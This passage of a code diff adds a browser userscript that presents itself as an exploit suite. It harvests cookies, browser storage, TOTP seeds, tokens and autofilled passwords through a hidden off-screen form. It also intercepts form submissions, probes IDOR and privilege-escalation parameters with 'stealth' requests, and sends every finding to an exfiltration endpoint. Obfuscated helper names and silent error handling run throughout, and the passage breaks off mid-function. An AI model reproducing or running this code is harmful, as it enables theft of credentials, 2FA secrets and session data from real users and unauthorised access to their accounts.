+                            codeCount: codes.length
+                        }, exfilId);
+                    } else {
+                        addFinding('2fa', `Backup method endpoint accessible: ${endpoint}`, 'medium', {
+                            endpoint,
+                            status: response.status
+                        });
+                    }
+                }
+            } catch (e) {
+                // Silent fail
+            }
+        }
+    }
+    
+    async function totpSeedExtraction() {
+        log('Scanning for TOTP seeds and secrets...', 'info');
+        
+        // Look for TOTP secrets in various locations
+        const locations = [
+            { name: 'localStorage', data: localStorage },
+            { name: 'sessionStorage', data: sessionStorage },
+            { name: 'window variables', data: window }
+        ];
+        
+        const totpPatterns = [
+            /otpauth:\/\/totp\/[^"'\s]+/gi,
+            /secret[=:][\s]*["']?([A-Z2-7]{16,})["']?/gi,
+            /[A-Z2-7]{32}/g // Base32 encoded secrets
+        ];
+        
+        for (const location of locations) {
+            try {
+                const content = JSON.stringify(location.data);
+                
+                for (const pattern of totpPatterns) {
+                    const matches = content.match(pattern);
+                    if (matches && matches.length > 0) {
+                        const exfilId = await exfiltrateData('totp_secrets', {
+                            location: location.name,
+                            secrets: matches,
+                            extractedAt: Date.now()
+                        });
+                        
+                        addFinding('2fa', `TOTP secrets found in ${location.name}`, 'critical', {
+                            location: location.name,
+                            secretCount: matches.length
+                        }, exfilId);
+                    }
+                }
+            } catch (e) {
+                // Silent fail for inaccessible storage
+            }
+        }
+        
+        // Check DOM for QR code data
+        const qrElements = document.querySelectorAll('img[src*="otpauth"], [data-secret], [data-qr]');
+        if (qrElements.length > 0) {
+            const qrData = Array.from(qrElements).map(el => ({
+                src: el.src,
+                dataset: el.dataset,
+                attributes: Array.from(el.attributes).map(attr => ({ name: attr.name, value: attr.value }))
+            }));
+            
+            const exfilId = await exfiltrateData('qr_code_data', qrData);
+            
+            addFinding('2fa', `QR code elements with potential TOTP data`, 'high', {
+                elementCount: qrElements.length
+            }, exfilId);
+        }
+    }
+
+    // PRIVILEGE ESCALATION MODULE
+    async function scanPrivEscalation() {
+        log('Scanning for privilege escalation opportunities...', 'info');
+        
+        await idorDetection();
+        await parameterTampering();
+        await roleEnumeration();
+        await adminEndpointDiscovery();
+        
+        log('Privilege escalation scan complete', 'success');
+    }
+    
+    async function idorDetection() {
+        log('Testing for IDOR vulnerabilities...', 'info');
+        
+        const apiEndpoints = unsafeWindow.SCARE_API_ENDPOINTS || [];
+        
+        for (const endpoint of apiEndpoints) {
+            if (endpoint.extractedIds.length > 0) {
+                for (const originalId of endpoint.extractedIds) {
+                    // Test common IDOR patterns
+                    const testIds = [
+                        '1', '0', 'admin', 'root', 'test',
+                        (parseInt(originalId) + 1).toString(),
+                        (parseInt(originalId) - 1).toString(),
+                        originalId.replace(/\d/g, '1')
+                    ];
+                    
+                    for (const testId of testIds) {
+                        try {
+                            const testUrl = endpoint.url.replace(originalId, testId);
+                            const response = await stealthEngine.executeStealthRequest(testUrl, {
+                                method: 'GET',
+                                headers: { 'Cookie': document.cookie }
+                            });
+                            
+                            if (response.status === 200) {
+                                const content = await response.text();
+                                
+                                // Check if we got different user data
+                                if (content.length > 100 && !content.includes('not found') && !content.includes('unauthorized')) {
+                                    const exfilId = await exfiltrateData('idor_data', {
+                                        originalUrl: endpoint.url,
+                                        testUrl,
+                                        originalId,
+                                        testId,
+                                        response: content.substring(0, 2000)
+                                    });
+                                    
+                                    addFinding('privesc', `IDOR vulnerability: ${testUrl}`, 'high', {
+                                        originalId,
+                                        testId,
+                                        method: 'id_enumeration'
+                                    }, exfilId);
+                                }
+                            }
+                        } catch (e) {
+                            // Silent fail
+                        }
+                        
+                        // Rate limiting
+                        await new Promise(resolve => _0x1a2b._setTimeout(resolve, 500));
+                    }
+                }
+            }
+        }
+    }
+    
+    async function parameterTampering() {
+        log('Testing parameter tampering attacks...', 'info');
+        
+        const networkLog = unsafeWindow.SCARE_NETWORK_LOG || [];
+        const apiRequests = networkLog.filter(req => req.classification && req.classification.includes('api'));
+        
+        for (const request of apiRequests.slice(-10)) { // Test last 10 API requests
+            if (request.requestBody) {
+                try {
+                    const body = JSON.parse(request.requestBody);
+                    
+                    // Test privilege escalation parameters
+                    const escalationParams = {
+                        role: ['admin', 'administrator', 'root', 'superuser'],
+                        isAdmin: [true, 'true', '1'],
+                        admin: [true, 'true', '1'],
+                        privilege: ['admin', 'root', 'superuser'],
+                        level: ['admin', '999', '0'],
+                        type: ['admin', 'administrator']
+                    };
+                    
+                    for (const [param, values] of Object.entries(escalationParams)) {
+                        for (const value of values) {
+                            const tamperedBody = { ...body, [param]: value };
+                            
+                            try {
+                                const response = await stealthEngine.executeStealthRequest(request.url, {
+                                    method: request.method,
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                        'Cookie': document.cookie
+                                    },
+                                    body: JSON.stringify(tamperedBody)
+                                });
+                                
+                                if (response.status === 200) {
+                                    const content = await response.text();
+                                    
+                                    // Look for success indicators
+                                    if (content.includes('admin') || content.includes('privilege') || content.includes('elevated')) {
+                                        const exfilId = await exfiltrateData('parameter_tampering', {
+                                            originalRequest: request,
+                                            tamperedParam: param,
+                                            tamperedValue: value,
+                                            response: content.substring(0, 1000)
+                                        });
+                                        
+                                        addFinding('privesc', `Parameter tampering success: ${param}=${value}`, 'high', {
+                                            url: request.url,
+                                            parameter: param,
+                                            value: value
+                                        }, exfilId);
+                                    }
+                                }
+                            } catch (e) {
+                                // Silent fail
+                            }
+                            
+                            await new Promise(resolve => _0x1a2b._setTimeout(resolve, 300));
+                        }
+                    }
+                } catch (e) {
+                    // Not JSON or other error
+                }
+            }
+        }
+    }
+    
+    async function roleEnumeration() {
+        log('Enumerating user roles and permissions...', 'info');
+        
+        // Look for role information in network responses
+        const networkLog = unsafeWindow.SCARE_NETWORK_LOG || [];
+        
+        for (const request of networkLog) {
+            if (request.responseBody) {
+                const response = request.responseBody.toLowerCase();
+                
+                // Look for role indicators
+                const rolePatterns = [
+                    /role["\s:]*["']?([^"',\s]+)/gi,
+                    /permission[s]?["\s:]*\[([^\]]+)\]/gi,
+                    /group[s]?["\s:]*["']?([^"',\s]+)/gi,
+                    /level["\s:]*(\d+)/gi
+                ];
+                
+                for (const pattern of rolePatterns) {
+                    const matches = request.responseBody.match(pattern);
+                    if (matches && matches.length > 0) {
+                        const exfilId = await exfiltrateData('role_enumeration', {
+                            url: request.url,
+                            roles: matches,
+                            fullResponse: request.responseBody.substring(0, 1000)
+                        });
+                        
+                        addFinding('privesc', `Role information exposed: ${request.url}`, 'medium', {
+                            url: request.url,
+                            roleCount: matches.length
+                        }, exfilId);
+                        break;
+                    }
+                }
+            }
+        }
+    }
+    
+    async function adminEndpointDiscovery() {
+        log('Discovering administrative endpoints...', 'info');
+        
+        const adminPaths = [
+            '/admin', '/administrator', '/admin.php', '/admin/',
+            '/dashboard/admin', '/panel', '/control', '/manage',
+            '/api/admin', '/api/v1/admin', '/backend', '/cp',
+            '/admin/users', '/admin/settings', '/admin/config'
+        ];
+        
+        for (const path of adminPaths) {
+            try {
+                const response = await stealthEngine.executeStealthRequest(location.origin + path, {
+                    method: 'GET',
+                    headers: { 'Cookie': document.cookie }
+                });
+                
+                if (response.status === 200) {
+                    const content = await response.text();
+                    
+                    // Check if it looks like an admin panel
+                    if (content.includes('admin') || content.includes('dashboard') || 
+                        content.includes('users') || content.includes('settings')) {
+                        
+                        const exfilId = await exfiltrateData('admin_endpoint', {
+                            path,
+                            content: content.substring(0, 2000),
+                            accessible: true
+                        });
+                        
+                        addFinding('privesc', `Administrative endpoint accessible: ${path}`, 'high', {
+                            path,
+                            status: response.status
+                        }, exfilId);
+                    }
+                } else if (response.status === 403 || response.status === 401) {
+                    addFinding('privesc', `Administrative endpoint exists but protected: ${path}`, 'medium', {
+                        path,
+                        status: response.status
+                    });
+                }
+            } catch (e) {
+                // Silent fail
+            }
+        }
+    }
+
+    // SCAN MODULES
+    async function scanEndpoints() {
+        log('Scanning for exposed endpoints...', 'info');
+
+        for (const endpoint of CFG.endpoints) {
+            if (state.stopRequested) break;
+
+            try {
+                const url = location.origin + endpoint;
+                const response = await secureRequest(url, { method: 'GET' });
+
+                if (response.status === 200) {
+                    const contentType = response.headers.get('content-type') || '';
+                    const responseText = await response.text();
+
+                    if (responseText.includes('secret') || responseText.includes('password') ||
+                        responseText.includes('key') || responseText.includes('token')) {
+                        const exfilId = await exfiltrateData('endpoint_leak', {
+                            endpoint,
+                            status: response.status,
+                            contentType,
+                            content: responseText.substring(0, 2000)
+                        });
+
+                        addFinding('endpoints', `Sensitive endpoint exposed: ${endpoint}`, 'high',
+                            { endpoint, contentType, responseSize: responseText.length }, exfilId);
+                    } else {
+                        addFinding('endpoints', `Endpoint exposed: ${endpoint}`, 'low',
+                            { endpoint, contentType, responseSize: responseText.length });
+                    }
+                }
+            } catch (error) {
+                // Silent fail for 404s
+            }
+        }
+    }
+
+    async function scanGraphQL() {
+        log('Testing for GraphQL introspection...', 'info');
+
+        const introspectionQuery = {
+            query: `{
+                __schema {
+                    queryType { name }
+                    mutationType { name }
+                    types {
+                        name
+                        fields {
+                            name
+                            type { name }
+                        }
+                    }
+                }
+            }`
+        };
+
+        try {
+            const response = await secureRequest(location.origin + CFG.graphqlPath, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(introspectionQuery)
+            });
+
+            if (response.status === 200) {
+                const data = await response.json();
+                if (data.data && data.data.__schema) {
+                    state.graphqlSchema = data.data.__schema;
+                    const exfilId = await exfiltrateData('graphql_schema', state.graphqlSchema);
+                    addFinding('graphql', 'GraphQL introspection enabled - full schema exposed', 'high',
+                        { schemaSize: JSON.stringify(state.graphqlSchema).length }, exfilId);
+                }
+            }
+        } catch (error) {
+            addFinding('graphql', 'GraphQL endpoint test error', 'low', { error: error.message });
+        }
+    }
+
+    async function scanCORS() {
+        log('Testing for CORS misconfiguration...', 'info');
+
+        const origins = ['https://evil.com', 'null', 'https://attacker.com'];
+
+        for (const origin of origins) {
+            try {
+                const response = await secureRequest(location.origin + CFG.corsPath, {
+                    method: 'GET',
+                    headers: { 'Origin': origin }
+                });
+
+                const acaoHeader = response.headers.get('access-control-allow-origin');
+                const acacHeader = response.headers.get('access-control-allow-credentials');
+
+                if (acaoHeader === origin || acaoHeader === '*') {
+                    const severity = acacHeader === 'true' ? 'high' : 'medium';
+                    addFinding('cors', `CORS Misconfiguration: ${origin}`, severity,
+                        { origin, allowCredentials: acacHeader === 'true' });
+                }
+            } catch (error) {
+                // Silent fail
+            }
+        }
+    }
+
+    async function scanXSS() {
+        log('Testing for XSS reflection...', 'info');
+
+        const customPayload = document.getElementById('custom-payload').value;
+        const payloads = customPayload ? [customPayload] : CFG.xssTestPayloads;
+
+        for (const payload of payloads) {
+            if (state.stopRequested) break;
+
+            const testPayload = payload.replace(/{{EXFIL_URL}}/g, CFG.exfiltrationEndpoint);
+            const encodedPayload = encodeURIComponent(testPayload);
+
+            // Test via URL parameter
+            const testUrl = `${location.href}${location.href.includes('?') ? '&' : '?'}test=${encodedPayload}`;
+
+            try {
+                const response = await secureRequest(testUrl);
+                const responseText = await response.text();
+
+                if (responseText.includes(testPayload) || responseText.includes(decodeURIComponent(testPayload))) {
+                    addFinding('xss', `XSS Reflection Found`, 'high',
+                        { vector: 'URL parameter', payload: testPayload });
+                }
+            } catch (error) {
+                // Silent fail
+            }
+        }
+    }
+
+    async function scanDOM() {
+        log('Scanning DOM for secrets...', 'info');
+
+        const secretPatterns = [            /api[_-]?key["\s]*[:=]["\s]*["']([^"']+)["']/gi,
+            /secret["\s]*[:=]["\s]*["']([^"']+)["']/gi,
+            /token["\s]*[:=]["\s]*["']([^"']+)["']/gi,
+            /password["\s]*[:=]["\s]*["']([^"']+)["']/gi,
+            /auth["\s]*[:=]["\s]*["']([^"']+)["']/gi
+        ];
+
+        // Check inline scripts
+        const scripts = document.querySelectorAll('script:not([src])');
+        const foundSecrets = [];
+
+        scripts.forEach(script => {
+            const content = script.textContent;
+            secretPatterns.forEach(pattern => {
+                const matches = content.matchAll(pattern);
+                for (const match of matches) {
+                    foundSecrets.push({
+                        type: 'inline_script',
+                        pattern: pattern.source,
+                        value: match[1]
+                    });
+                }
+            });
+        });
+
+        // Check comments
+        const walker = document.createTreeWalker(
+            document.body,
+            NodeFilter.SHOW_COMMENT,
+            null,
+            false
+        );
+
+        let comment;
+        while (comment = walker.nextNode()) {
+            secretPatterns.forEach(pattern => {
+                const matches = comment.textContent.matchAll(pattern);
+                for (const match of matches) {
+                    foundSecrets.push({
+                        type: 'comment',
+                        pattern: pattern.source,
+                        value: match[1]
+                    });
+                }
+            });
+        }
+
+        if (foundSecrets.length > 0) {
+            const exfilId = await exfiltrateData('dom_secrets', foundSecrets);
+            addFinding('dom', `DOM secrets found: ${foundSecrets.length} potential leaks`, 'high',
+                { count: foundSecrets.length }, exfilId);
+        }
+    }
+
+    async function scanHeap() {
+        log('Analyzing heap memory...', 'info');
+
+        if (performance.memory) {
+            const memoryInfo = {
+                usedJSHeapSize: performance.memory.usedJSHeapSize,
+                totalJSHeapSize: performance.memory.totalJSHeapSize,
+                jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
+            };
+
+            addFinding('heap', 'Heap Memory Analysis', 'low', memoryInfo);
+
+            // Simulate finding sensitive data in memory
+            const heapLeaks = [];
+            for (const key in window) {
+                if (typeof window[key] === 'string' && key.toLowerCase().includes('token')) {
+                    heapLeaks.push({ key, value: window[key] });
+                }
+            }
+
+            if (heapLeaks.length > 0) {
+                const exfilId = await exfiltrateData('heap_leaks', heapLeaks);
+                addFinding('heap', `Heap memory leaks detected`, 'medium', { count: heapLeaks.length }, exfilId);
+            }
+        }
+    }
+
+    async function scanJSLeaks() {
+        log('Scanning for JavaScript leaks...', 'info');
+
+        const leakPatterns = ['apiKey', 'api_key', 'secret', 'token', 'password', 'auth', 'credential'];
+        const foundLeaks = [];
+
+        // Check window object
+        for (const key in window) {
+            if (leakPatterns.some(pattern => key.toLowerCase().includes(pattern))) {
+                if (typeof window[key] === 'string' && window[key].length > 0) {
+                    foundLeaks.push({
+                        source: 'window',
+                        key: key,
+                        value: window[key]
+                    });
+                }
+            }
+        }
+
+        // Check localStorage
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            if (leakPatterns.some(pattern => key.toLowerCase().includes(pattern))) {
+                foundLeaks.push({
+                    source: 'localStorage',
+                    key: key,
+                    value: localStorage.getItem(key)
+                });
+            }
+        }
+
+        // Check sessionStorage
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            if (leakPatterns.some(pattern => key.toLowerCase().includes(pattern))) {
+                foundLeaks.push({
+                    source: 'sessionStorage',
+                    key: key,
+                    value: sessionStorage.getItem(key)
+                });
+            }
+        }
+
+        // Scan all global variables
+        const allSecrets = [];
+        try {
+            for (const key in window) {
+                if (window.hasOwnProperty(key)) {
+                    const value = window[key];
+                    if (typeof value === 'string' && value.length > 10) {
+                        if (/^[a-zA-Z0-9_-]{20,}$/.test(value) ||
+                            /^eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+$/.test(value)) {
+                            allSecrets.push({
+                                source: 'window',
+                                key: key,
+                                value: value,
+                                type: value.startsWith('eyJ') ? 'JWT' : 'API_KEY'
+                            });
+                        }
+                    }
+                }
+            }
+        } catch (e) {
+            log(`Error scanning globals: ${e.message}`, 'error');
+        }
+
+        // Combine all findings
+        const allFindings = [...foundLeaks, ...allSecrets];
+
+        if (allFindings.length > 0) {
+            const exfilId = await exfiltrateData('jsleaks', allFindings);
+            addFinding('jsleaks', 'JavaScript Memory Leaks Detected', 'high', {
+                secretCount: allFindings.length,
+                secrets: allFindings
+            }, exfilId);
+            log(`JS leaks scan found ${allFindings.length} potential secrets`, 'info');
+        }
+    }
+
+    async function scanAutofill() {
+        log('Executing autofill exploitation module...', 'info');
+        log('Scanning for browser-stored autofill data...', 'info');
+
+        const allFieldNames = Object.values(COMMON_FIELD_NAMES).flat();
+        const mutatedNames = mutateFieldNames(allFieldNames);
+
+        log(`Testing ${mutatedNames.length} field name variants for autofill data`, 'info');
+
+        // Create hidden form for credential harvesting
+        const form = document.createElement('form');
+        form.style.position = 'absolute';
+        form.style.left = '-9999px';
+        form.style.opacity = '0';
+        form.style.visibility = 'hidden';
+
+        const harvestedData = [];
+        const inputPromises = [];
+
+        // Test existing forms on page first
+        const existingInputs = document.querySelectorAll('input[type="password"], input[type="email"], input[type="text"]');
+        existingInputs.forEach(input => {
+            if (input.value && input.value.trim()) {
+                harvestedData.push({
+                    field: input.name || input.id || 'unknown',
+                    type: input.type,
+                    value: input.value,
+                    source: 'existing_form'
+                });
+            }
+        });
+
+        // Create test inputs to trigger autofill
+        for (const fieldName of mutatedNames.slice(0, 30)) { // Test 30 for performance
+            if (state.stopRequested) break;
+
+            const input = document.createElement('input');
+            input.name = fieldName;
+            input.id = fieldName;
+            input.type = fieldName.includes('pass') ? 'password' : 'text';
+            input.autocomplete = 'on';
+
+            // Set attributes to trigger autofill
+            if (fieldName.includes('email')) {
+                input.type = 'email';
+                input.autocomplete = 'email';
+            } else if (fieldName.includes('user')) {
+                input.autocomplete = 'username';
+            } else if (fieldName.includes('pass')) {
+                input.autocomplete = 'current-password';
+            }
+
+            form.appendChild(input);
+
+            // Create promise to check for autofill after short delay
+            const promise = new Promise(resolve => {
+                _0x1a2b._setTimeout(() => {
+                    if (input.value && input.value.trim()) {
+                        harvestedData.push({
+                            field: fieldName,
+                            type: input.type,
+                            value: input.value,
+                            source: 'autofill_trigger'
+                        });
+                    }
+                    resolve();
+                }, 100);
+            });
+
+            inputPromises.push(promise);
+        }
+
+        document.body.appendChild(form);
+
+        // Focus on first input to potentially trigger autofill
+        const firstInput = form.querySelector('input');
+        if (firstInput) {
+            firstInput.focus();
+        }
+
+        // Wait for all autofill checks to complete
+        await Promise.all(inputPromises);
+
+        // Check for stored credentials in browser storage
+        try {
+            for (const key in localStorage) {
+                if (/token|auth|pass|credential|user|login/i.test(key) && localStorage[key]) {
+                    harvestedData.push({
+                        field: key,
+                        value: localStorage[key],
+                        source: 'localStorage'
+                    });
+                }
+            }
+
+            for (const key in sessionStorage) {
+                if (/token|auth|pass|credential|user|login/i.test(key) && sessionStorage[key]) {
+                    harvestedData.push({
+                        field: key,
+                        value: sessionStorage[key],
+                        source: 'sessionStorage'
+                    });
+                }
+            }
+        } catch (error) {
+            log(`Error accessing browser storage: ${error.message}`, 'warning');
+        }
+
+        // Clean up
+        _0x1a2b._setTimeout(() => {
+            if (document.body.contains(form)) {
+                document.body.removeChild(form);
+            }
+
+            if (harvestedData.length > 0) {
+                const exfilId = exfiltrateData('autofill_harvest', harvestedData);
+                addFinding('autofill', `Browser credentials and autofill data detected`, 'high', {
+                    harvestedCount: harvestedData.length,
+                    data: harvestedData.map(item => ({ field: item.field, type: item.type, source: item.source })),
+                    totalTested: mutatedNames.length
+                }, exfilId);
+
+                log(`Successfully harvested ${harvestedData.length} credential entries from browser`, 'success');
+            } else {
+                log('No autofill data detected - browser may not have stored credentials for this site', 'info');
+            }
+        }, 2000);
+    }
+
+    // ENHANCED DOM EXPLORER
+    function launchDOMExplorer() {
+        const domData = {
+            forms: Array.from(document.forms).map(f => ({
+                action: f.action,
+                method: f.method,
+                elements: Array.from(f.elements).map(e => ({
+                    name: e.name,
+                    type: e.type,
+                    value: e.value
+                }))
+            })),
+            inputs: Array.from(document.querySelectorAll('input')).map(i => ({
+                name: i.name,
+                type: i.type,
+                value: i.value,
+                placeholder: i.placeholder
+            })),
+            scripts: Array.from(document.scripts).map(s => ({
+                src: s.src,
+                hasContent: !!s.textContent,
+                size: s.textContent ? s.textContent.length : 0
+            })),
+            links: Array.from(document.links).slice(0, 20).map(l => ({
+                href: l.href,
+                text: l.textContent.substring(0, 50)
+            })),
+            metas: Array.from(document.querySelectorAll('meta')).map(m => ({
+                name: m.name,
+                content: m.content,
+                property: m.property
+            }))
+        };
+
+        const content = `
+            <div class="dom-explorer">
+                <input type="text" id="dom-search" placeholder="Search DOM elements..." style="width: 100%; margin-bottom: 10px; padding: 5px; background: #2a2a3a; color: #e0e0e0; border: 1px solid #4a90e2;">
+                <div class="dom-tree" id="dom-tree">
+                    <div class="tree-section">
+                        <h4>📋 Forms (${domData.forms.length})</h4>
+                        ${domData.forms.map((form, i) => `
+                            <div class="tree-item" onclick="this.querySelector('.tree-children').style.display = this.querySelector('.tree-children').style.display === 'none' ? 'block' : 'none';">
+                                <strong>Form ${i+1}:</strong> ${form.action || 'No action'} (${form.method || 'GET'})
+                                <div class="tree-children" style="display: none;">
+                                    ${form.elements.map(el => `<div>🔸 ${el.name || 'unnamed'} (${el.type}) ${el.value ? '= ' + el.value.substring(0, 30) : ''}</div>`).join('')}
+                                </div>
+                            </div>
+                        `).join('')}
+                    </div>
+                    <div class="tree-section">
+                        <h4>📝 Input Fields (${domData.inputs.length})</h4>
+                        ${domData.inputs.map(input => `
+                            <div class="tree-item">
+                                ${input.name || 'unnamed'} - ${input.type} ${input.placeholder ? `(${input.placeholder})` : ''}
+                                ${input.value ? `<span style="color: #e74c3c;"> = ${input.value.substring(0, 30)}</span>` : ''}
+                            </div>
+                        `).join('')}
+                    </div>
+                    <div class="tree-section">
+                        <h4>📜 Scripts (${domData.scripts.length})</h4>
+                        ${domData.scripts.map((script, i) => `
+                            <div class="tree-item">
+                                Script ${i+1}: ${script.src || 'Inline'} ${script.hasContent ? `(${script.size} chars)` : ''}
+                            </div>
+                        `).join('')}
+                    </div>
+                    <div class="tree-section">
+                        <h4>🔗 Links (${domData.links.length > 20 ? '20 of ' + domData.links.length : domData.links.length})</h4>
+                        ${domData.links.map(link => `
+                            <div class="tree-item">
+                                <a href="${link.href}" target="_blank" style="color: #4a90e2;">${link.text || link.href}</a>
+                            </div>
+                        `).join('')}
+                    </div>
+                    <div class="tree-section">
+                        <h4>📊 Meta Tags (${domData.metas.length})</h4>
+                        ${domData.metas.map(meta => `
+                            <div class="tree-item">
+                                ${meta.name || meta.property || 'unknown'}: ${(meta.content || '').substring(0, 50)}
+                            </div>
+                        `).join('')}
+                    </div>
+                </div>
+                <div style="margin-top: 15px;">
+                    <button class="scare-btn scare-btn-secondary" id="toggle-raw-dom">Show Raw JSON</button>
+                    <button class="scare-btn scare-btn-primary" id="export-dom">Export DOM Data</button>
+                </div>
+                <div id="raw-dom" style="display: none;">
+                    <pre>${JSON.stringify(domData, null, 2)}</pre>
+                </div>
+            </div>
+        `;
+
+        const modal = createModal('🔍 Enhanced DOM Explorer', content);
+
+        // Add search functionality
+        modal.querySelector('#dom-search').addEventListener('input', function(e) {
+            const searchTerm = e.target.value.toLowerCase();
+            const items = modal.querySelectorAll('.tree-item');
+            items.forEach(item => {
+                const text = item.textContent.toLowerCase();
+                item.style.display = text.includes(searchTerm) ? 'block' : 'none';
+            });
+        });
+
+        // Toggle raw view
+        modal.querySelector('#toggle-raw-dom').addEventListener('click', function() {
+            const rawDiv = modal.querySelector('#raw-dom');
+            const treeDiv = modal.querySelector('#dom-tree');
+            if (rawDiv.style.display === 'none') {
+                rawDiv.style.display = 'block';
+                treeDiv.style.display = 'none';
+                this.textContent = 'Show Tree View';
+            } else {
+                rawDiv.style.display = 'none';
+                treeDiv.style.display = 'block';
+                this.textContent = 'Show Raw JSON';
+            }
+        });
+
+        // Export functionality
+        modal.querySelector('#export-dom').addEventListener('click', function() {
+            const blob = new Blob([JSON.stringify(domData, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `dom-data-${Date.now()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        });
+    }
+
+    // Launch comprehensive exploit suite modal
+    function launchExploitSuite() {
+        const content = `
+            <div class="exploit-suite-modal">
+                <h2>🎯 Professional Exploit Suite</h2>
+
+                <div class="exploit-category">
+                    <h3>🎯 XSS Exploitation</h3>
+                    <div class="exploit-options">
+                        <button class="scare-btn scare-btn-exploit" onclick="window.launchCookieExfiltration()">Cookie Exfiltration</button>
+                        <button class="scare-btn scare-btn-exploit" onclick="window.launchStorageDump()">Storage Dump</button>
+                        <button class="scare-btn scare-btn-exploit" onclick="window.launchDOMSnapshot()">DOM Snapshot</button>
+                    </div>
+                </div>
+
+                <div class="exploit-category">
+                    <h3>🔍 GraphQL Exploitation</h3>
+                    <div class="exploit-options">
+                        <button class="scare-btn scare-btn-exploit" onclick="window.launchQueryData()">Query Data</button>
+                        <button class="scare-btn scare-btn-exploit" onclick="window.launchTestMutations()">Test Mutations</button>
+                    </div>
+                </div>
+
+                <div class="exploit-category">
+                    <h3>🍪 Credential Harvesting</h3>
+                    <div class="exploit-options">
+                        <button class="scare-btn scare-btn-exploit" onclick="window.launchTriggerAutofill()">Trigger Autofill</button>
+                        <button class="scare-btn scare-btn-exploit" onclick="window.launchInterceptForms()">Intercept Forms</button>
+                    </div>
+                </div>
+
+                <div class="exploit-category">
+                    <h3>🎪 Custom Exploitation</h3>
+                    <div class="custom-payload-section">
+                        <textarea id="custom-js-payload" placeholder="Enter custom JavaScript payload..." rows="4" style="width: 100%; margin-bottom: 10px; background: #1a1a1a; color: #e0e0e0; border: 1px solid #444; padding: 8px;"></textarea>
+                        <button class="scare-btn scare-btn-primary" onclick="window.executeCustomPayload()">Execute Payload</button>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        createModal('Exploit Suite', content);
+    }
+
+    // Make functions globally accessible for modal buttons
+    window.launchCookieExfiltration = function() {
+        log('Launching cookie exfiltration...', 'info');
+        try {
+            const cookies = document.cookie;
+            if (cookies) {
+                exfiltrateData('cookie_exfil', { cookies, timestamp: Date.now(), url: location.href });
+                log('Cookie exfiltration completed successfully', 'success');
+            } else {
+                log('No cookies found to exfiltrate', 'warning');
+            }
+        } catch (error) {
+            log(`Cookie exfiltration failed: ${error.message}`, 'error');
+        }
+    };
+
+    window.launchStorageDump = function() {
+        log('Dumping browser storage...', 'info');
+        try {
+            const storageData = {
+                localStorage: Object.fromEntries(Object.entries(localStorage)),
+                sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
+                cookies: document.cookie,
+                url: location.href,
+                timestamp: Date.now()
+            };
+
+            exfiltrateData('storage_dump', storageData);
+            log('Storage dump completed successfully', 'success');
+        } catch (error) {
+            log(`Storage dump failed: ${error.message}`, 'error');
+        }
+    };
+
+    window.launchDOMSnapshot = function() {
+        log('Taking DOM snapshot...', 'info');
+        try {
+            const domSnapshot = {
+                html: document.documentElement.outerHTML.substring(0, 10000), // Limit size
+                url: location.href,
+                timestamp: Date.now(),
+                forms: Array.from(document.forms).map(f => ({
+                    action: f.action,
+                    method: f.method,
+                    elements: Array.from(f.elements).map(e => ({
+                        name: e.name,
+                        type: e.type,
+                        value: e.value
+                    }))
+                }))
+            };
+
+            exfiltrateData('dom_snapshot', domSnapshot);
+            log('DOM snapshot captured successfully', 'success');
+        } catch (error) {
+            log(`DOM snapshot failed: ${error.message}`, 'error');
+        }
+    };
+
+    window.launchQueryData = function() {
+        log('Executing GraphQL query exploitation...', 'info');
+        try {
+            if (state.graphqlSchema) {
+                const queries = state.graphqlSchema.queryType?.fields?.map(f => f.name) || [];
+                log(`Available queries: ${queries.join(', ')}`, 'info');
+                exfiltrateData('graphql_queries', { queries, schema: state.graphqlSchema });
+            } else {
+                log('No GraphQL schema available for exploitation', 'warning');
+            }
+        } catch (error) {
+            log(`GraphQL query exploitation failed: ${error.message}`, 'error');
+        }
+    };
+
+    window.launchTestMutations = function() {
+        log('Testing GraphQL mutations...', 'info');
+        try {
+            if (state.graphqlSchema && state.graphqlSchema.mutationType) {
+                const mutations = state.graphqlSchema.mutationType.fields?.map(f => f.name) || [];
+                log(`Available mutations: ${mutations.join(', ')}`, 'info');
+                exfiltrateData('graphql_mutations', { mutations, schema: state.graphqlSchema });
+            } else {
+                log('No GraphQL mutations available for testing', 'warning');
+            }
+        } catch (error) {
+            log(`GraphQL mutation testing failed: ${error.message}`, 'error');
+        }
+    };
+
+    window.launchTriggerAutofill = function() {
+        log('Triggering autofill harvesting...', 'info');
+        scanAutofill();
+    };
+
+    window.launchInterceptForms = function() {
+        log('Setting up form interception...', 'info');
+        try {
+            const forms = document.querySelectorAll('form');
+            let interceptedCount = 0;
+
+            forms.forEach((form, index) => {
+                form.addEventListener('submit', function(e) {
+                    const formData = new FormData(form);
+                    const data = Object.fromEntries(formData.entries());
+
+                    exfiltrateData('form_intercept', {
+                        formIndex: index,
+                        action: form.action,
+                        method: form.method,
+                        data: data,
+                        timestamp: Date.now()
+                    });
+
+                    log(`Form ${index + 1} intercepted with data`, 'success');
+                });
+
+                interceptedCount++;
+            });
+
+            log(`Form interception set up on ${interceptedCount} forms`, 'success');
+        } catch (error) {
+            log(`Form interception setup failed: ${error.message}`, 'error');
+        }
+    };
+
+    window.executeCustomPayload = function() {
+        const payload = document.getElementById('custom-js-payload').value;
+        if (!payload.trim()) {
+            log('No payload provided', 'warning');
+            return;
+        }
+
+        log('Executing custom payload...', 'info');
+        try {
+            safeExec(payload);
+            log('Custom payload executed successfully', 'success');
+            exfiltrateData('custom_payload', { payload, timestamp: Date.now() });
+        } catch (error) {
+            log(`Custom payload execution failed: ${error.message}`, 'error');
+        }
+    };
+
+    // Individual Exploit Functions
+    function launchEndpointExploit(finding) {
+        log(`Exploiting endpoint: ${finding.finding}`, 'info');
+        if (finding.data && finding.data.endpoint) {
+            window.open(location.origin + finding.data.endpoint, '_blank');
+            log('Endpoint exploit launched', 'success');
+        }
+    }
+
+    function launchJSLeaksExploit(finding) {
+        log('Executing JS leaks exploitation...', 'info');
+        try {
+            const payload = `
+                console.log('JS Memory Leaks Exploit Active');
+                for (const key in window) {
